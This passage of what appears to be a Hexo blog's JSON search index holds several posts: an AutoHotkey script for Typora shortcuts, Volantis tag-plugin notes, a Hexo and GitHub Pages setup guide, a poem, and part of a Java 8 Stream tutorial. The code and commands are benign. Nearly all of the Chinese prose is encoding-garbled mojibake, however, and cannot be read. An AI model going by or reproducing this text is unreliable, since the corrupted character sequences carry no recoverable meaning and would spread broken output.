å·¥ä½œé‡å¤§) é€‰æ‹©å…¶ä¸­ä¸€ç§ [ ] è°ƒç”¨ç¨‹åºæ‰“å¼€ e.g sublime text, notep++,ç­‰ [ ] ç›´æ¥æ‰“å¼€æ‰€åœ¨æ–‡ä»¶å¤¹,ç”¨æˆ·è‡ªå·±æ‰“å¼€é…ç½® [ ] è°ƒç”¨çª—å£,gui è®¾å®šå‚æ•°(å·¥ä½œé‡å¤§)","categories":[{"name":"é¡¹ç›®","slug":"é¡¹ç›®","permalink":"https://www.sizaif.com/navigation/categories/%E9%A1%B9%E7%9B%AE/"}],"tags":[{"name":"githubè®¡åˆ’","slug":"githubè®¡åˆ’","permalink":"https://www.sizaif.com/tags/github%E8%AE%A1%E5%88%92/"}],"author":"sizaif"},{"title":"AutoHotkey+Typora å®ç°å¿«æ·é”®è¾“å…¥Hexoæ ‡ç­¾æ’ä»¶","slug":"AutoHotkey-Typora-å®ç°å¿«æ·é”®è¾“å…¥hexoæ ‡ç­¾æ’ä»¶","date":"2021-08-08T12:30:40.000Z","updated":"2021-08-14T14:15:24.700Z","comments":true,"path":"posts/96be5746/","link":"","permalink":"https://www.sizaif.com/posts/96be5746/","excerpt":"","text":"AutoHotkey+Typora å®ç°å¿«æ·é”®è¾“å…¥hexoæ ‡ç­¾æ’ä»¶ [toc] éœ€æ±‚ ä½¿ç”¨hexoå†™åšå®¢æ—¶,hexoåŒ…æ‹¬ä¸»é¢˜æ–‡ä»¶,æä¾›äº†ä¸°å¯Œçš„æ ‡ç­¾æ’ä»¶ç¾åŒ–,åœ¨åšå®¢ä¸Šéå¸¸ç¾è§‚ç®€æ´,ç”šæ˜¯å–œæ¬¢. ä½†è¯­æ³•å†™èµ·æ¥æ¯”è¾ƒéº»çƒ¦,éœ€è¦æ¯æ¬¡æŸ¥è¯¢,æˆ–è€…æ‰‹æ‰“. äººç±»çš„æœ¬è´¨æ˜¯å»æ‰é‡å¤å·¥ä½œ,æ‡’æ˜¯æé«˜ç”Ÿäº§åŠ›çš„æœ€å¤§éšœç¢. æ•…è€Œæƒ³åˆ°äº†ä½¿ç”¨å¿«æ·é”®çš„æ–¹å¼åœ¨typoraä¸­å¿«é€Ÿçš„æ’å…¥è¯­æ³• æ‰€éœ€ç¯å¢ƒ AutoHotkey Typora AutoHotkey: å»å®˜ç½‘å®‰è£…å³å¯ AutoHotkeyå®˜ç½‘https://www.autohotkey.com/ Typora: å»å®˜ç½‘å®‰è£… Typoraå®˜ç½‘https://typora.io/ ç¼–å†™Autohotkeyè„šæœ¬ åˆ›å»ºxxx.ahkæ–‡ä»¶ ç²˜è´´æˆ‘å†™çš„ä»£ç è¿›å», å¯è‡ªå®šä¹‰è„šæœ¬,æ·»åŠ å…¶ä»–åŠŸèƒ½. ^ : ctrl !: alt #: win +: shift ~: alt+tab ä»£ç  ; Typora ; å¿«æ·è®¾ç½®å…¼å®¹hexoæ ¼å¼ ; SendInput &#123;Text&#125; è§£å†³ä¸­æ–‡è¾“å…¥æ³•é—®é¢˜ #IfWinActive ahk_exe Typora.exe &#123; ; ctrl+1 tab ^1::addtabcode() ; ctrl+2 note ^2::addnotecode() ; ctrl+3 folding ^3::addfoldingcode() ; ctrl+4 link ^4::addlinkcode() ; ctrl+5 span ^5::addspancode() ; ctrl+6 radio ^6::addradiocode() &#125; ; å¿«æ·è®¾ç½®tab addtabcode()&#123; clipboard := \"&#123;% tabs tab-id %&#125;`n`t&lt;!-- tab 1 -->`nreplace`n&lt;!-- endtab -->`n&lt;!-- tab 2 -->`nreplace`n&lt;!-- endtab -->`n&#123;% endtabs %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®note addnotecode()&#123; clipboard := \"&#123;% note danger, note error/danger %&#125;`n&#123;% note success, note done/success %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®folding addfoldingcode()&#123; clipboard := \"&#123;% folding green, text %&#125;`n&#123;% endfolding %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®link addlinkcode()&#123; clipboard := \"&#123;% link title, link %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®span addspancode()&#123; clipboard := \"&#123;% span parm, txt %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®radio addradiocode()&#123; clipboard := \"&#123;% radio green checked, text %&#125;\" Send ^v return &#125; ç¼–è¯‘è¿è¡Œ xxx.ahkæ–‡ä»¶ é¼ æ ‡å³é”®æ–‡ä»¶ compiler script åŒå‡»å¯åŠ¨è„šæœ¬ Typoraä¸­è¿è¡Œ å¿«å»æ„‰å¿«çš„æµ‹è¯•å§! é‡åˆ°é—®é¢˜ å½“è®¾ç½® alt æŒ‰é”®çš„æ—¶å€™, å¦‚æœè¿è¡Œæ—¶æŒ‰ä¸‹å‡ºç°é”®ç›˜åŠŸèƒ½å˜å¾—è¯¡å¼‚, è¯·å†æŒ‰ä¸€æ¬¡alt ç›¸å…³æ–‡æ¡£ ä½†é±¼å’Œç†ŠæŒä¸å¯å…¼å¾—,å½“é‡‡ç”¨typoraç¼–å†™mdæ–‡æ¡£æ—¶,typoraç­‰å…¶ä»–è½¯ä»¶æ˜¯ä¸æ”¯æŒhexoçš„æ’ä»¶è¯­æ³•çš„,æ•…è€Œä¸ä¼šå®æ—¶æ¸²æŸ“çš„.åªä¼šæ˜¾ç¤ºæºä»£ç : ä¾‹å¦‚ æºç  &#123;% note danger, note error/danger %&#125; &#123;% note success, note done/success %&#125; å½“å»CSDNç­‰å…¶ä»–åšå®¢å‘è¡¨æ—¶,ä¼šæŠŠæºä»£ç æ˜¾ç¤ºå‡ºæ¥,æ˜¾å¾—éå¸¸ä¸‘. è§£å†³æ–¹æ³•: pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³•https://www.sizaif.com/2021/08/08/py%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E5%8E%BB%E9%99%A4hexo%E6%A0%87%E7%AD%BE%E6%8F%92%E4%BB%B6%E8%AF%AD%E6%B3%95/","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"}],"tags":[{"name":"ç½‘ç«™","slug":"ç½‘ç«™","permalink":"https://www.sizaif.com/tags/%E7%BD%91%E7%AB%99/"}],"author":"sizaif"},{"title":"Volantis 5.0 æ ‡ç­¾æ’ä»¶","slug":"volantis-5-0-æ ‡ç­¾æ’ä»¶","date":"2021-08-08T03:24:11.000Z","updated":"2021-08-14T14:15:24.715Z","comments":true,"path":"posts/e55b6fd4/","link":"","permalink":"https://www.sizaif.com/posts/e55b6fd4/","excerpt":"","text":"volantis 5.0 æ ‡ç­¾æ’ä»¶ ä¸ºäº†å…¼å®¹è€ç”¨æˆ·ï¼Œæ—§çš„æ ‡ç­¾æ’ä»¶åœ¨é‡æ„ä¹‹å‰ä¾ç„¶æ²¿ç”¨æ—§çš„æ ¼å¼ï¼Œå³ command + ç©ºæ ¼ ä½œä¸ºå‚æ•°åˆ†éš”ç¬¦ï¼Œè€Œéƒ¨åˆ†æ–°å¢æ ‡ç­¾æ’ä»¶æ˜¯ ç©ºæ ¼ + è‹±æ–‡ç«–çº¿ + ç©ºæ ¼ ï¼Œè¯·æ³¨æ„åŒºåˆ†ã€‚ æˆ‘ä»¬ä¹Ÿåœ¨æ¢ç´¢å“ªç§åˆ†éš”ç¬¦æ—¢ç®€å•åˆä¸å®¹æ˜“å¼•èµ·å†²çªï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨å¤šç§æ ¼å¼ï¼Œå…·ä½“ä»¥å¯¹åº”æ–‡æ¡£æè¿°ä¸ºå‡†ã€‚ text æ•ˆæœæºç å¸¦ ä¸‹åˆ’çº¿ çš„æ–‡æœ¬ï¼›å¸¦ ç€é‡å· çš„æ–‡æœ¬ï¼›å¸¦ æ³¢æµªçº¿ çš„æ–‡æœ¬ï¼›å¸¦ åˆ é™¤çº¿ çš„æ–‡æœ¬ é”®ç›˜æ ·å¼çš„æ–‡æœ¬ï¼šâŒ˜ + D å¯†ç æ ·å¼çš„æ–‡æœ¬ï¼šè¿™é‡Œæ²¡æœ‰éªŒè¯ç å¸¦ &#123;% u ä¸‹åˆ’çº¿ %&#125; çš„æ–‡æœ¬ï¼›å¸¦ &#123;% emp ç€é‡å· %&#125; çš„æ–‡æœ¬ï¼›å¸¦ &#123;% wavy æ³¢æµªçº¿ %&#125; çš„æ–‡æœ¬ï¼›å¸¦ &#123;% del åˆ é™¤çº¿ %&#125; çš„æ–‡æœ¬ é”®ç›˜æ ·å¼çš„æ–‡æœ¬ï¼š&#123;% kbd âŒ˜ %&#125; + &#123;% kbd D %&#125; å¯†ç æ ·å¼çš„æ–‡æœ¬ï¼š&#123;% psw è¿™é‡Œæ²¡æœ‰éªŒè¯ç  %&#125; æ ‡ç­¾æ’ä»¶https://volantis.js.org/v5/tag-plugins/","categories":[{"name":"å»ºç«™ç¬”è®°","slug":"å»ºç«™ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"ç½‘ç«™","slug":"ç½‘ç«™","permalink":"https://www.sizaif.com/tags/%E7%BD%91%E7%AB%99/"}],"author":"sizaif"},{"title":"Hexo+githubåšå®¢æ­å»º","slug":"hexo-githubåšå®¢æ­å»º","date":"2021-08-08T03:20:47.000Z","updated":"2021-09-19T10:16:09.808Z","comments":true,"path":"posts/b4a23979/","link":"","permalink":"https://www.sizaif.com/posts/b4a23979/","excerpt":"","text":"hexo+githubåšå®¢æ­å»º éœ€æ±‚ å°†æœ¬åœ°åšå®¢å­˜æ”¾åœ¨DropBoxäº‘ä¸­ ä½¿ç”¨hexoæ„å»ºåšå®¢ç³»ç»Ÿ ä½¿ç”¨githubä½œä¸ºè¿œç¨‹ä»“åº“ ä½¿ç”¨giteeä½œä¸ºå¤‡ç”¨ä»“åº“ ç»‘å®šåŸŸå æœ¬åœ°ä½¿ç”¨ssh gitæ–¹å¼æ¨é€ æ­å»ºæ­¥éª¤ å®‰è£…å¿…è¦ç¯å¢ƒ git windows10 (éå¿…é¡») Hexo: 4.2 ~ 5.x hexo-cli: 3.1 ~ 4.x node.js: 12.16 ~ latest # æ¨èä½¿ç”¨ LTS ç‰ˆ npm: 6.13 ~ latest å®‰è£…node,js: https://nodejs.org/en/ å®‰è£…git: https://git-scm.com/ å®‰è£…node.js å’Œgitåè¿›è¡Œæµ‹è¯•: $ npm -v $ git --version å®‰è£…hexo: å› ä¸ºæˆ‘å°†blogæ–‡ä»¶å­˜æ”¾åœ¨Dropboxäº‘ä¸­, è€ŒDropboxæœ¬åœ°æ–‡ä»¶åœ¨.Dropbox\\XXX è‹¥ä¹‹é—´ä½¿ç”¨npmå‘½ä»¤åˆ™ä¼šå‡ºç°æ‰¾ä¸åˆ°åŒ…çš„é—®é¢˜ æˆ‘è¿™é‡Œçš„è§£å†³æ–¹æ³•æ˜¯: å…ˆåœ¨æ§åˆ¶å°ä½¿ç”¨npm å‘½ä»¤å®‰è£… npm install hexo-cli -g å°†ç›®å½•C:\\Users\\XXX\\AppData\\Roaming\\npm ä¸‹çš„ node_moduleså’Œ hexo*ç›¸å…³çš„æ–‡ä»¶å¤åˆ¶ä¸€ä»½åˆ°.Dropbox\\XXX\\Blog\\ä¸‹ åœ¨.Dropbox\\XXX\\Blog\\ä¸‹æ‰“å¼€æ§åˆ¶å°ç»§ç»­æ‰§è¡Œå®‰è£…hexoçš„å‘½ä»¤ # å®‰è£… npm install hexo-cli -g # æµ‹è¯•ç‰ˆæœ¬ $ hexo -v # å®‰è£… $ hexo init blog &amp; cd blog &amp; npm install # æµè§ˆå™¨è®¿é—® localhost:4000 æµ‹è¯• $ hexo server # æ­¤æ—¶æœ¬åœ°å®‰è£…hexoå·²å®Œæˆ hexoæ–‡ä»¶æ ‘: . â”œâ”€â”€ _config.yml # ç½‘ç«™çš„é…ç½®ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤é…ç½®å¤§éƒ¨åˆ†çš„å‚æ•°ã€‚ â”œâ”€â”€ package.json â”œâ”€â”€ scaffolds # æ¨¡ç‰ˆæ–‡ä»¶å¤¹ â”œâ”€â”€ source # èµ„æºæ–‡ä»¶å¤¹ï¼Œé™¤ _posts æ–‡ä»¶ï¼Œå…¶ä»–ä»¥ä¸‹åˆ’çº¿_å¼€å¤´çš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ä¸ä¼šè¢«ç¼–è¯‘æ‰“åŒ…åˆ°publicæ–‡ä»¶å¤¹ | â”œâ”€â”€ _drafts # è‰ç¨¿æ–‡ä»¶ | â””â”€â”€ _posts # æ–‡ç« Markdowmæ–‡ä»¶ â””â”€â”€ themes # ä¸»é¢˜æ–‡ä»¶å¤¹ å¦‚æœé‡åˆ°npm å®‰è£… æŠ¥é”™é—®é¢˜, å°è¯•åˆ é™¤ package-lock.json å†è¯• hexoå¸¸ç”¨å‘½ä»¤: hexo npm install hexo -g #å®‰è£… npm update hexo -g #å‡çº§ hexo init #åˆå§‹åŒ– ç®€å†™ hexo n \"æˆ‘çš„åšå®¢\" == hexo new \"æˆ‘çš„åšå®¢\" #æ–°å»ºæ–‡ç«  hexo p == hexo publish hexo g == hexo generate#ç”Ÿæˆ hexo s == hexo server #å¯åŠ¨æœåŠ¡é¢„è§ˆ hexo d == hexo deploy#éƒ¨ç½² æœåŠ¡å™¨ hexo server #Hexo ä¼šç›‘è§†æ–‡ä»¶å˜åŠ¨å¹¶è‡ªåŠ¨æ›´æ–°ï¼Œæ‚¨æ— é¡»é‡å¯æœåŠ¡å™¨ã€‚ hexo server -s #é™æ€æ¨¡å¼ hexo server -p 5000 #æ›´æ”¹ç«¯å£ hexo server -i 192.168.1.1 #è‡ªå®šä¹‰ IP hexo clean #æ¸…é™¤ç¼“å­˜ ç½‘é¡µæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥å¿½ç•¥æ­¤æ¡å‘½ä»¤ hexo g #ç”Ÿæˆé™æ€ç½‘é¡µ hexo d #å¼€å§‹éƒ¨ç½² ç›‘è§†æ–‡ä»¶å˜åŠ¨ hexo generate #ä½¿ç”¨ Hexo ç”Ÿæˆé™æ€æ–‡ä»¶å¿«é€Ÿè€Œä¸”ç®€å• hexo generate --watch #ç›‘è§†æ–‡ä»¶å˜åŠ¨ å®Œæˆåéƒ¨ç½² ä¸¤ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ç›¸åŒçš„ hexo generate --deploy hexo deploy --generate hexo deploy -g hexo server -g è‰ç¨¿ hexo publish [layout] &lt;title> å®‰è£…hexoä¸»é¢˜: å®‰è£…é€‚åˆè‡ªå·±å£å‘³çš„ä¸»é¢˜ è®¾ç½®github github æ–°å»ºä»“åº“,ä»“åº“åç§°ä¸º XXX.github.io; XXXä¸ºä½ çš„ç”¨æˆ·å! æ³¨æ„é¡¹: 1. ==ä»“åº“åç§°ä¸­XXXå¿…é¡»ä¸ç”¨æˆ·åå¯¹åº”!!!!== 2. æ–¹å¼ä¸º`public` è®¾ç½®ä½¿ç”¨sshæ–¹å¼æ¨é€ æŸ¥çœ‹æœ¬åœ°C:\\Users\\XXX\\.ssh ä¸‹æœ‰æ— id_rsaæ ·å¼æ–‡ä»¶ è‹¥æ— ,åˆ›å»ºæ–°çš„ssh å¯†é’¥, $ ssh-keygen -T rsa -C 'githubé‚®ç®±åœ°å€' # å›è½¦ç»§ç»­, passphrase å¯†ç å¯è¾“å…¥å¯ä¸è¾“ å¤åˆ¶.sshç›®å½•ä¸‹çš„id_rsa.pubä¸­æ–‡ä»¶å†…å®¹åˆ°github ssh keysç®¡ç†ä¸­ æµ‹è¯•ssh $ ssh git@github.com è‹¥å‡ºç°: ssh: connect to host github.com port 22: Connection refused é”™è¯¯ è§£å†³æ–¹æ³•: XXX\\.sshç›®å½•ä¸‹åˆ›å»ºconfigæ–‡ä»¶ configæ–‡ä»¶ä¸­å†™å…¥ä¸‹é¢çš„ä¿¡æ¯ï¼š Host github.com User xxxxx@xx.com(githubç”¨æˆ·é‚®ç®±) Hostname ssh.github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa Port 443 å†ä½¿ç”¨ssh git@github.comæµ‹è¯• é€‰æ‹©é…ç½®è‡ªå·±çš„hexo ä¸»é¢˜(å¯é€‰) é€‰æ‹©é€‚åˆè‡ªå·±å£å‘³çš„blogä¸»é¢˜å³å¯ åŸŸåç»‘å®šgithub åŸŸåè§£æå•†è§£ææ–¹å¼é€‰æ‹©CNAME; ç«™ç‚¹ä¸º: XXX.github.io xxx.github.ioä»“åº“ä¸­,settingé€‰é¡¹Pageä¸­é…ç½® Custom domain å†…å®¹ä¸ºä½ çš„åŸŸå,saveä¿å­˜ blog æ ¹ç›®å½•ä¸‹çš„sourceæ–‡ä»¶ä¸­åˆ›å»ºCNAMEæ–‡ä»¶ (å¿…é¡»é€‰é¡¹) å†…å®¹ä¸ºä½ çš„åŸŸå ä½œç”¨: é˜²æ­¢æ¯æ¬¡hexoæ¨é€åšå®¢å,åŸŸåè§£æå¤±æ•ˆ,é‡æ–°é…ç½®Custom domain","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Hexo","slug":"æŠ€æœ¯å‘/Hexo","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Hexo/"}],"tags":[{"name":"ç½‘ç«™","slug":"ç½‘ç«™","permalink":"https://www.sizaif.com/tags/%E7%BD%91%E7%AB%99/"}],"author":"sizaif"},{"title":"å¹ä¸€å¹äº‘ç©ºè°ƒ","slug":"å¹ä¸€å¹äº‘ç©ºè°ƒ","date":"2021-08-07T17:09:52.000Z","updated":"2022-02-03T09:28:21.000Z","comments":true,"path":"posts/bfcf32d/","link":"","permalink":"https://www.sizaif.com/posts/bfcf32d/","excerpt":"","text":"","categories":[],"tags":[],"author":"sizaif"},{"title":"ç¬¬ä¸€æ¬¡å»ºç«™","slug":"ç¬¬ä¸€æ¬¡å»ºç«™","date":"2021-08-07T15:28:55.000Z","updated":"2021-09-19T07:24:21.000Z","comments":true,"path":"posts/8b3781ae/","link":"","permalink":"https://www.sizaif.com/posts/8b3781ae/","excerpt":"","text":"[TOC] æ˜¥æ±ŸèŠ±æœˆå¤œ æ˜¥æ±Ÿæ½®æ°´è¿æµ·å¹³ï¼Œæµ·ä¸Šæ˜æœˆå…±æ½®ç”Ÿã€‚ æ»Ÿæ»Ÿéšæ³¢åƒä¸‡é‡Œï¼Œä½•å¤„æ˜¥æ±Ÿæ— æœˆæ˜ï¼ æ±Ÿæµå®›è½¬ç»•èŠ³ç”¸ï¼Œæœˆç…§èŠ±æ—çš†ä¼¼éœ°ï¼› ç©ºé‡Œæµéœœä¸è§‰é£ï¼Œæ±€ä¸Šç™½æ²™çœ‹ä¸è§ã€‚ æ±Ÿå¤©ä¸€è‰²æ— çº¤å°˜ï¼Œçšçšç©ºä¸­å­¤æœˆè½®ã€‚ æ±Ÿç•”ä½•äººåˆè§æœˆï¼Ÿæ±Ÿæœˆä½•å¹´åˆç…§äººï¼Ÿ äººç”Ÿä»£ä»£æ— ç©·å·²ï¼Œæ±Ÿæœˆå¹´å¹´æœ›ç›¸ä¼¼ã€‚ ä¸çŸ¥æ±Ÿæœˆå¾…ä½•äººï¼Œä½†è§é•¿æ±Ÿé€æµæ°´ã€‚ ç™½äº‘ä¸€ç‰‡å»æ‚ æ‚ ï¼Œé’æ«æµ¦ä¸Šä¸èƒœæ„ã€‚ è°å®¶ä»Šå¤œæ‰èˆŸå­ï¼Ÿä½•å¤„ç›¸æ€æ˜æœˆæ¥¼ï¼Ÿ å¯æ€œæ¥¼ä¸Šæœˆè£´å›ï¼Œåº”ç…§ç¦»äººå¦†é•œå°ã€‚ ç‰æˆ·å¸˜ä¸­å·ä¸å»ï¼Œæ£è¡£ç §ä¸Šæ‹‚è¿˜æ¥ã€‚ æ­¤æ—¶ç›¸æœ›ä¸ç›¸é—»ï¼Œæ„¿é€æœˆåæµç…§å›ã€‚ é¸¿é›é•¿é£å…‰ä¸åº¦ï¼Œé±¼é¾™æ½œè·ƒæ°´æˆæ–‡ã€‚ æ˜¨å¤œé—²æ½­æ¢¦è½èŠ±ï¼Œå¯æ€œæ˜¥åŠä¸è¿˜å®¶ã€‚ æ±Ÿæ°´æµæ˜¥å»æ¬²å°½ï¼Œæ±Ÿæ½­è½æœˆå¤è¥¿æ–œã€‚ æ–œæœˆæ²‰æ²‰è—æµ·é›¾ï¼Œç¢£çŸ³æ½‡æ¹˜æ— é™è·¯ã€‚ ä¸çŸ¥ä¹˜æœˆå‡ äººå½’ï¼Œè½æœˆæ‘‡æƒ…æ»¡æ±Ÿæ ‘ã€‚ å¯„è¯­ æ„¿æ‰€æœ‰æ—¥æ—¥å¤œå¤œçš„åŠªåŠ›éƒ½èƒ½è¿æ¥æ˜æ—¥çš„åˆå‡çš„å¤ªé˜³ by sizaif 2021-08-07 23:38:41 ä½ å¥½æ˜å¤©","categories":[{"name":"æ‚æ–‡","slug":"æ‚æ–‡","permalink":"https://www.sizaif.com/navigation/categories/%E6%9D%82%E6%96%87/"}],"tags":[{"name":"ç½‘ç«™","slug":"ç½‘ç«™","permalink":"https://www.sizaif.com/tags/%E7%BD%91%E7%AB%99/"}],"author":"sizaif"},{"title":"Java8 Stream æ•™ç¨‹å­¦ä¹ ","slug":"Java8-Stream-æ•™ç¨‹å­¦ä¹ ","date":"2021-05-29T12:37:59.000Z","updated":"2021-09-19T10:15:53.793Z","comments":true,"path":"posts/2180828f/","link":"","permalink":"https://www.sizaif.com/posts/2180828f/","excerpt":"","text":"Java8 Stream æ•™ç¨‹å­¦ä¹  ğŸ˜„ @Auther: sizaif ğŸ“† 2021-05-29 20:37:59 ğŸ”— è½¬è½½ç¿»è¯‘äº https://winterbe.com/posts/2014/07/31/java8-stream-tutorial-examples/ [TOC] è¯´æ˜ è¿™ä¸ªç¤ºä¾‹é©±åŠ¨çš„æ•™ç¨‹æ·±å…¥æ¦‚è¿°äº†Java 8æµã€‚å½“æˆ‘ç¬¬ä¸€æ¬¡è¯»åˆ°Stream APIæ—¶ï¼Œæˆ‘å¯¹å®ƒçš„åå­—æ„Ÿåˆ°å›°æƒ‘ï¼Œå› ä¸ºå®ƒå¬èµ·æ¥ç±»ä¼¼äºJava I/Oä¸­çš„InputStreamå’ŒOutputStreamã€‚ä½†æ˜¯Java 8æµæ˜¯å®Œå…¨ä¸åŒçš„ä¸œè¥¿ã€‚Streamæ˜¯Monadsï¼Œå› æ­¤åœ¨å°†å‡½æ•°å¼ç¼–ç¨‹å¼•å…¥Javaä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²: åœ¨å‡½æ•°å¼ç¼–ç¨‹ï¼ŒMonadsæ˜¯ä¸€ä¸ªç»“æ„ï¼Œè¡¨ç¤ºè®¡ç®—å®šä¹‰ä¸ºä¸€ç³»åˆ—çš„æ­¥éª¤ã€‚ä¸€ä¸ªå…·æœ‰å•å­ç»“æ„çš„ç±»å‹å®šä¹‰äº†å°†æ“ä½œé“¾èµ·æ¥çš„å«ä¹‰ï¼Œæˆ–å°†è¯¥ç±»å‹çš„å‡½æ•°åµŒå¥—åœ¨ä¸€èµ·ã€‚ æœ¬æŒ‡å—æ•™ä½ å¦‚ä½•ä½¿ç”¨Java 8æµä»¥åŠå¦‚ä½•ä½¿ç”¨ä¸åŒç±»å‹çš„å¯ç”¨æµæ“ä½œã€‚æ‚¨å°†äº†è§£å¤„ç†é¡ºåºä»¥åŠæµæ“ä½œçš„é¡ºåºå¦‚ä½•å½±å“è¿è¡Œæ—¶æ€§èƒ½ã€‚æ›´å¼ºå¤§çš„æµæ“ä½œreduceï¼Œcollectå’ŒflatMapå°†è¯¦ç»†ä»‹ç»ã€‚æœ¬æ•™ç¨‹æœ€åå¯¹å¹¶è¡Œæµè¿›è¡Œäº†æ·±å…¥ç ”ç©¶ã€‚ æµæ˜¯å¦‚ä½•å·¥ä½œçš„(How streams work) ä¸€ä¸ªæµè¡¨ç¤ºä¸€ä¸ªå…ƒç´ åºåˆ—ï¼Œå¹¶æ”¯æŒä¸åŒç±»å‹çš„æ“ä½œæ¥å¯¹è¿™äº›å…ƒç´ æ‰§è¡Œè®¡ç®—: List&lt;String> myList = Arrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\"); myList .stream() .filter(s -> s.startsWith(\"c\")) .map(String::toUpperCase) .sorted() .forEach(System.out::println); // C1 // C2 æµæ“ä½œå¯ä»¥æ˜¯ä¸­é—´æ“ä½œï¼Œä¹Ÿå¯ä»¥æ˜¯ç»ˆç«¯æ“ä½œã€‚ä¸­é—´æ“ä½œè¿”å›ä¸€ä¸ªæµï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸ä½¿ç”¨åˆ†å·é“¾æ¥å¤šä¸ªä¸­é—´æ“ä½œ.ç»ˆç«¯æ“ä½œè¦ä¹ˆä¸ºç©ºï¼Œè¦ä¹ˆè¿”å›éæµç»“æœ.ä¸Šé¢çš„è¿‡æ»¤å™¨ç¤ºä¾‹ä¸­ï¼Œmapå’Œsortedæ˜¯ä¸­é—´æ“ä½œï¼Œè€ŒforEachæ˜¯ç»ˆç«¯æ“ä½œã€‚æœ‰å…³æ‰€æœ‰å¯ç”¨æµæ“ä½œçš„å®Œæ•´åˆ—è¡¨ï¼Œè¯·å‚é˜…stream Javadocã€‚å¦‚ä¸Šä¾‹ä¸­æ‰€ç¤ºçš„è¿™ç§æµæ“ä½œé“¾ä¹Ÿç§°ä¸ºæ“ä½œç®¡é“ã€‚ å¤§å¤šæ•°æµæ“ä½œæ¥å—æŸç§ç±»å‹çš„lambdaè¡¨è¾¾å¼å‚æ•°ï¼Œä¸€ä¸ªæŒ‡å®šæ“ä½œç¡®åˆ‡è¡Œä¸ºçš„å‡½æ•°æ¥å£ã€‚å¤§å¤šæ•°æ“ä½œå¿…é¡»æ˜¯æ— å¹²æ‰°å’Œæ— çŠ¶æ€çš„ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€? å½“ä¸€ä¸ªå‡½æ•°ä¸ä¿®æ”¹æµçš„åŸºç¡€æ•°æ®æºæ—¶ï¼Œå®ƒå°±æ˜¯æ— å¹²æ‰°çš„,ä¾‹å¦‚,åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ²¡æœ‰ä¸€ä¸ªlambdaè¡¨è¾¾å¼é€šè¿‡ä»é›†åˆä¸­æ·»åŠ æˆ–åˆ é™¤å…ƒç´ æ¥ä¿®æ”¹myListã€‚ å½“æ“ä½œçš„æ‰§è¡Œæ˜¯ç¡®å®šçš„æ—¶ï¼Œå‡½æ•°å°±æ˜¯æ— çŠ¶æ€ çš„ï¼Œä¾‹å¦‚ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ²¡æœ‰lambdaè¡¨è¾¾å¼ä¾èµ–äºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½æ”¹å˜çš„å¤–éƒ¨ä½œç”¨åŸŸçš„ä»»ä½•å¯å˜å˜é‡æˆ–çŠ¶æ€ã€‚ ä¸åŒç±»å‹çš„æµ(Different kind of streams) å¯ä»¥ä»å„ç§æ•°æ®æºåˆ›å»ºæµï¼Œç‰¹åˆ«æ˜¯é›†åˆã€‚åˆ—è¡¨å’Œé›†åˆæ”¯æŒæ–°çš„æ–¹æ³•stream()å’ŒparallelStream()æ¥åˆ›å»ºé¡ºåºæµæˆ–å¹¶è¡Œæµã€‚å¹¶è¡Œæµèƒ½å¤Ÿåœ¨å¤šä¸ªçº¿ç¨‹ä¸Šæ“ä½œï¼Œæœ¬æ•™ç¨‹çš„åé¢ä¸€èŠ‚å°†å¯¹æ­¤è¿›è¡Œä»‹ç»ã€‚æˆ‘ä»¬ç°åœ¨ä¸»è¦å…³æ³¨é¡ºåºæµ: Arrays.asList(\"a1\", \"a2\", \"a3\") .stream() .findFirst() .ifPresent(System.out::println); // a1 åœ¨å¯¹è±¡åˆ—è¡¨ä¸Šè°ƒç”¨æ–¹æ³•stream()å°†è¿”å›ä¸€ä¸ªå¸¸è§„å¯¹è±¡æµã€‚ä½†æˆ‘ä»¬ä¸éœ€è¦åˆ›å»ºé›†åˆæ¥å¤„ç†æµï¼Œå°±åƒæˆ‘ä»¬åœ¨ä¸‹ä¸€ä¸ªä»£ç ç¤ºä¾‹ä¸­çœ‹åˆ°çš„: Stream.of(\"a1\", \"a2\", \"a3\") .findFirst() .ifPresent(System.out::println); // a1 åªéœ€ä½¿ç”¨stream .of()ä»ä¸€å †å¯¹è±¡å¼•ç”¨åˆ›å»ºä¸€ä¸ªæµã€‚ é™¤äº†å¸¸è§„çš„å¯¹è±¡æµä¹‹å¤–ï¼ŒJava 8è¿˜æä¾›äº†ç‰¹æ®Šç±»å‹çš„æµï¼Œç”¨äºå¤„ç†åŸºæœ¬æ•°æ®ç±»å‹intã€longå’Œdoubleã€‚ä½ å¯èƒ½å·²ç»çŒœåˆ°æ˜¯IntStream, LongStreamå’ŒDoubleStreamã€‚ IntStreamså¯ä»¥ä½¿ç”¨IntStream.range()æ›¿æ¢å¸¸è§„çš„forå¾ªç¯: IntStream.range(1, 4) .forEach(System.out::println); // 1 // 2 // 3 